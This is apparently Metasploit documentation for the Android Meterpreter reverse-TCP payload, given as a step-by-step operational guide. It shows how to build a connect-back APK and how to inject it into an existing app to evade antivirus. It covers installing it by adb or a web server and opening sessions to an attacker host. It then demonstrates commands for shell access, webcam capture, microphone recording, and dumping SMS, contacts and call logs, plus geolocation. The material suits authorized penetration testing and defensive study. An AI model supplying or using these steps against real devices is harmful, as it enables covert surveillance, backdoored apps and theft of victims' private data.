{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/android/meterpreter/reverse_tcp","result":{"data":{"moduleMetadataJson":{"id":"348a3595-ff05-5e2c-8a7c-c2f5f5b6240b","name":"Android Meterpreter, Android Reverse TCP Stager","fullname":"payload/android/meterpreter/reverse_tcp","description":"Run a meterpreter server in Android. Connect back stager","rank":300,"fields":{"detailsSlug":"/modules/details/payload/android/meterpreter/reverse_tcp","documentationSlug":"/modules/documentation/payload/android/meterpreter/reverse_tcp","referencesSlug":"/modules/references/payload/android/meterpreter/reverse_tcp"},"documentation":{"html":"<p>The android/meterpreter/reverse_tcp payload is a Java-based Meterpreter that can be used on an\nAndroid device. It is still at an early stage of development, but there are so many things you can\ndo with it already.</p>\n<p>The Android Meterpreter allows you to do things like take remote control the file system, listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>You can test android/meterpreter/reverse_tcp on these devices:</p>\n<p><strong>Android Emulator</strong></p>\n<p>An emulator is the most convenient way to test Android Meterpreter. You can try:</p>\n<ul>\n<li><a href=\"http://developer.android.com/sdk/index.html#Other\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Android SDK</a> - Creates and manages your emulators from a command prompt or terminal.</li>\n<li><a href=\"http://developer.android.com/sdk/installing/index.html?pkg=studio\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Android Studio</a> - Allows you to manage emulators more easily than the SDK.</li>\n<li><a href=\"https://www.genymotion.com/download/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GenyMotion</a> - Requires an account. </li>\n<li><a href=\"https://github.com/dral3x/AndroidAVDRepo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">AndroidAVDRepo</a> - Contains a collection of pre-configured emulators.</li>\n</ul>\n<p><strong>A real Android device</strong></p>\n<p>Having a real Android device allows you to test features or vulnerabilities you don't necessarily\nhave from an emulator, which might be specific to a manufacturer, carrier, or hardware. You also\nget to test it over a real network.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Currently, the most common way to use Android Meterpreter is to create it as an APK, and then\nexecute it.</p>\n<p>To create the APK with msfconsole:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use payload/android/meterpreter/reverse_tcp \nmsf payload(reverse_tcp) &gt; set LHOST 192.168.1.199\nLHOST =&gt; 192.168.1.199\nmsf payload(reverse_tcp) &gt; generate -t raw -f /tmp/android.apk\n[*] Writing 8992 bytes to /tmp/android.apk...\nmsf payload(reverse_tcp) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"to-create-the-apk-with-msfvenom\" style=\"position:relative;\"><a href=\"#to-create-the-apk-with-msfvenom\" aria-label=\"to create the apk with msfvenom permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>To create the APK with msfvenom:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h3 id=\"to-inject-meterpreter-into-an-existing-apk-with-msfvenom\" style=\"position:relative;\"><a href=\"#to-inject-meterpreter-into-an-existing-apk-with-msfvenom\" aria-label=\"to inject meterpreter into an existing apk with msfvenom permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>To inject meterpreter into an existing APK with msfvenom:</h3>\n<p>You can also add Android meterpreter to any existing APK. This will make it harder for\nAnti-virus software to detect the payload, and allow you read internal files and take\nscreenshots of the Android app that you are backdooring:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/injection.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Please see here for more documentation on Android injection</a>.</p>\n<p>Next, start an Android device. Upload the APK, and execute it. There are different ways to do this,\nso please refer to the Scenarios section for more information.</p>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p><strong>pwd</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command allows you to see the current directory you're in.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\n/data/data/com.metasploit.stage</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd</strong></p>\n<p>The <code class=\"language-text\">cd</code> command allows you to change directory. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd cache\nmeterpreter &gt; ls</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cat</strong></p>\n<p>The <code class=\"language-text\">cat</code> command allows you to see the contents of a file.</p>\n<p><strong>ls</strong></p>\n<p>The <code class=\"language-text\">ls</code> command displays items in a directory. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ls\nListing: /data/data/com.metasploit.stage/files\n==============================================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100444/r--r--r--  0     fil   2016-03-08 14:56:08 -0600  rList-com.metasploit.stage.MainActivity</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>upload</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. The <code class=\"language-text\">-r</code> option\nallows you to do so recursively.</p>\n<p><strong>download</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you to download a file from the remote target. The <code class=\"language-text\">-r</code>\noption allows you to do so recursively.</p>\n<p><strong>search</strong></p>\n<p>The <code class=\"language-text\">search</code> command allows you to find files on the remote target. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; search -d . -f *.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>ifconfig</strong></p>\n<p>The <code class=\"language-text\">ifconfig</code> command displays the network interfaces on the remote machine.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ifconfig\n\n...\n\nInterface 10\n============\nName         : wlan0 - wlan0\nHardware MAC : 60:f1:89:07:c2:7e\nIPv4 Address : 192.168.1.207\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : 2602:30a:2c51:e660:62f1:89ff:fe07:c27e\nIPv6 Netmask : ::\nIPv6 Address : fe80::62f1:89ff:fe07:c27e\nIPv6 Netmask : ::\nIPv6 Address : 2602:30a:2c51:e660:81ae:6bbd:e0e1:5954\nIPv6 Netmask : ::\n\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>getuid</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command shows the current user that the payload is running as:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: u0_a231</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>ps</strong></p>\n<p>The <code class=\"language-text\">ps</code> command shows a list of processes the Android device is running. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ps \n\nProcess List\n============\n\n PID    Name                                                         Arch  User\n ---    ----                                                         ----  ----\n 1      /init                                                              root\n 2      kthreadd                                                           root\n 3      ksoftirqd/0                                                        root\n 7      migration/0                                                        root\n 8      rcu_preempt                                                        root\n 9      rcu_bh                                                             root\n 10     rcu_sched                                                          root\n 11     watchdog/0                                                         root\n 12     watchdog/1                                                         root\n 13     migration/1                                                        root\n 14     ksoftirqd/1                                                        root\n 17     watchdog/2                                                         root\n 18     migration/2                                                        root\n 19     ksoftirqd/2                                                        root\n 22     watchdog/3                                                         root\n 23     migration/3                                                        root\n\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>shell</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with a shell:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 1 created.\nChannel 1 created.\nid\nuid=10231(u0_a231) gid=10231(u0_a231) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),9997(everybody),50231(all_a231) context=u:r:untrusted_app:s0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To get back to the Meterpreter prompt, you can do: [CTRL]+[Z]</p>\n<p><strong>sysinfo</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the Android device.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer    : localhost\nOS          : Android 5.1.1 - Linux 3.10.61-6309174 (aarch64)\nMeterpreter : java/android</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>webcam_list</strong></p>\n<p>The <code class=\"language-text\">webcam_list</code> command shows a list of webcams you could use for the <code class=\"language-text\">webcam_snap</code>\ncommand. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; webcam_list\n1: Back Camera\n2: Front Camera</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>webcam_snap</strong></p>\n<p>The <code class=\"language-text\">webcam_snap</code> command takes a picture from the device. You will have to use the\n<code class=\"language-text\">webcam_list</code> command to figure out which camera to use. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; webcam_snap -i 2\n[*] Starting...\n[+] Got frame\n[*] Stopped\nWebcam shot saved to: /Users/user/rapid7/msf/uFWJXeQt.jpeg</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>record_mic</strong></p>\n<p>The <code class=\"language-text\">record_mic</code> command records audio. Good for listening to a phone conversation, as well as\nother uses. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; record_mic -d 20\n[*] Starting...\n[*] Stopped\nAudio saved to: /Users/user/rapid7/msf/YAUtubCR.wav</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>activity_start</strong></p>\n<p>The <code class=\"language-text\">activity_start</code> command is an execute command by starting an Android activity from a URI\nstring.</p>\n<p><strong>check_root</strong></p>\n<p>The <code class=\"language-text\">check_root</code> command detects whether your payload is running as root or not. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; check_root\n[*] Device is not rooted</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>dump_calllog</strong></p>\n<p>The <code class=\"language-text\">dump_calllog</code> command retrieves the call log from the Android device.</p>\n<p><strong>dump_contacts</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; dump_contacts\n[*] Fetching 5 contacts into list\n[*] Contacts list saved to: contacts_dump_20160308155744.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>geolocate</strong></p>\n<p>The <code class=\"language-text\">geolocate</code> commands allows you to locate the phone by retrieving the current lat-long\nusing geolocation.</p>\n<p><strong>wlan_geolocate</strong></p>\n<p>The <code class=\"language-text\">wlan_geolocation</code> command allows you to locate the phone by retrieving the current\nlat-long using WLAN information. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; wlan_geolocate\n[*] Google indicates the device is within 150 meters of 30.*******,-97.*******.\n[*] Google Maps URL:  https://maps.google.com/?q=30.*******,-97.*******</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>send_sms</strong></p>\n<p>The <code class=\"language-text\">send_sms</code> command allows you to send an SMS message. Keep in mind the phone will keep a\ncopy of it, too.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; send_sms -d &quot;2674554859&quot; -t &quot;hello&quot;\n[+] SMS sent - Transmission successful</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>sms_dump</strong></p>\n<p>The <code class=\"language-text\">sms_dump</code> command allows you to retrieve SMS messages. And save them as a text file.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; dump_sms\n[*] Fetching 4 sms messages\n[*] SMS messages saved to: sms_dump_20160308163212.txt\n\n...\n\n$ cat sms_dump_20160308163212.txt\n\n=====================\n[+] SMS messages dump\n=====================\n\nDate: 2016-03-08 15:30:12 -0600\nOS: Android 5.1.1 - Linux 3.10.61-6309174 (aarch64)\nRemote IP: 192.168.1.207\nRemote Port: 59130\n\n#1\nType\t: Incoming\nDate\t: 2016-03-08 15:29:32\nAddress\t: **********\nStatus\t: NOT_RECEIVED\nMessage\t: Hello world\n\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>run</strong></p>\n<p>The <code class=\"language-text\">run</code> command allows you to run a post module against the remote machine at the Meterpreter\nprompt. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; run post/android/capture/screen </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Uploading APK to an Emulator using install<em>msf</em>apk.sh</strong></p>\n<p>The Metasploit Framework comes with a script that allows you to automatically upload your APK to\nan active emulator and execute it. It requires the <a href=\"http://developer.android.com/sdk/installing/index.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Android SDK platform-tools</a> to run, as well as <a href=\"https://java.com/en/download/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Java</a>.</p>\n<p>To use this, follow these steps:</p>\n<ol>\n<li>Start the Android Emulator</li>\n<li>Generate the Android payload as an APK.</li>\n<li>In msfconsole, start a handler for android/meterpreter/reverse_tcp</li>\n<li>Run the installer script like this from a terminal:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ tools/exploit/install_msf_apk.sh /tmp/android.apk</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The the script will do something like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ tools/exploit/install_msf_apk.sh /tmp/android.apk \n   adding: META-INF/ANDROIDD.SF\n   adding: META-INF/ANDROIDD.RSA\n  signing: classes.dex\n  signing: AndroidManifest.xml\n  signing: resources.arsc\nFailure\n1562 KB/s (10715 bytes in 0.006s)\n\tpkg: /data/local/tmp/android.apk\nSuccess\nrm failed for -f, Read-only file system\nStarting: Intent { act=android.intent.action.MAIN cmp=com.metasploit.stage/.MainActivity }</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Back in msfconsole, you should receive a session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP handler on 192.168.1.199:4444 \n[*] Starting the payload handler...\n[*] Sending stage (62432 bytes) to 192.168.1.199\n[*] Meterpreter session 1 opened (192.168.1.199:4444 -&gt; 192.168.1.199:49178) at 2016-03-08 13:00:10 -0600\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Uploading APK to a real Android device using install<em>msf</em>apk.sh</strong></p>\n<p>On the Android device, make sure to enable Developer Options. To do this:</p>\n<ol>\n<li>Go to Settings -> About -> Software Information</li>\n<li>Tap on the Build Number section a couple of times. It should unlock Developer Options.</li>\n<li>Go back to the Settings page, you should see Developer Options.</li>\n</ol>\n<p>Under Developer Options, make sure to:</p>\n<ul>\n<li>Enable USB debugging</li>\n<li>Disable Verify apps via USB</li>\n<li>Open a terminal, and type: <code class=\"language-text\">adb devices</code>. On your Android device, you should see a prompt\nasking you to allow the computer for debugging, click OK on that.</li>\n<li>Do: <code class=\"language-text\">adb devices</code> again, adb should now have access.</li>\n</ul>\n<p>Run the installer script like this from a terminal:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ tools/exploit/install_msf_apk.sh /tmp/android.apk</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>And you should get a session.</p>\n<p><strong>Uploading APK from a Web Server</strong></p>\n<p>One way to upload an APK to Android without adb is by hosting it from a web server. To do this,\nyou must make sure to allow to trust \"Unknown sources\". The way to do this varies, but normally\nit's something like this: Settings -> Security -> Check \"Unknown Sources\"</p>\n<p>Once you have that changed, you'll need to:</p>\n<ol>\n<li>Generate the APK payload.</li>\n<li>Start a web server from the directory where the payload is: <code class=\"language-text\">ruby -run -e httpd . -p 8181</code></li>\n<li>On your Android device, open a browser, and download the APK.</li>\n<li>You should be able to find the APK from the Downloads folder, install it.</li>\n<li>After installation, you will have to manually execute it.</li>\n</ol>\n<p><strong>Reconnect Android Meterpreter from the Browser Remotely</strong></p>\n<p>When you have the APK payload installed on your Android device, another trick to reconnect it is to\nlaunch an intent from a browser. An intent is simply a term in Android development that means \"an operation to be performed.\"</p>\n<p>Here's how you do this:</p>\n<ol>\n<li>In msfconsole, start a multi/handler for android/meterpreter/reverse_tcp as a background job.</li>\n<li>Do: <code class=\"language-text\">auxiliary/server/android_browsable_msf_launch</code>.</li>\n<li>Set the URIPATh if needed.</li>\n<li>Do: <code class=\"language-text\">run</code>. At this point, the web server should be up.</li>\n<li>On your Android device, open the native web browser, and go the URL generated by the auxiliary\nmodule.</li>\n<li>The Android handler should get a session like the following demo:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/handler \nmsf exploit(handler) &gt; set PAYLOAD android/meterpreter/reverse_tcp\nPAYLOAD =&gt; android/meterpreter/reverse_tcp\nmsf exploit(handler) &gt; set LHOST 192.168.1.199\nLHOST =&gt; 192.168.1.199\nmsf exploit(handler) &gt; set EXITONSESSION false\nEXITONSESSION =&gt; false\nmsf exploit(handler) &gt; run -j\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.1.199:4444 \nmsf exploit(handler) &gt; [*] Starting the payload handler...\n\nmsf exploit(handler) &gt; use auxiliary/server/android_browsable_msf_launch\nmsf auxiliary(android_browsable_msf_launch) &gt; set URIPATH /test\nURIPATH =&gt; /test\nmsf auxiliary(android_browsable_msf_launch) &gt; run\n\n[*] Using URL: http://0.0.0.0:8080/test\n[*] Local IP: http://192.168.1.199:8080/test\n[*] Server started.\n[*] Sending HTML...\n[*] Sending stage (62432 bytes) to 192.168.1.207\n[*] Meterpreter session 1 opened (192.168.1.199:4444 -&gt; 192.168.1.207:47523) at 2016-03-08 15:09:25 -0600</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"348a3595-ff05-5e2c-8a7c-c2f5f5b6240b"}}}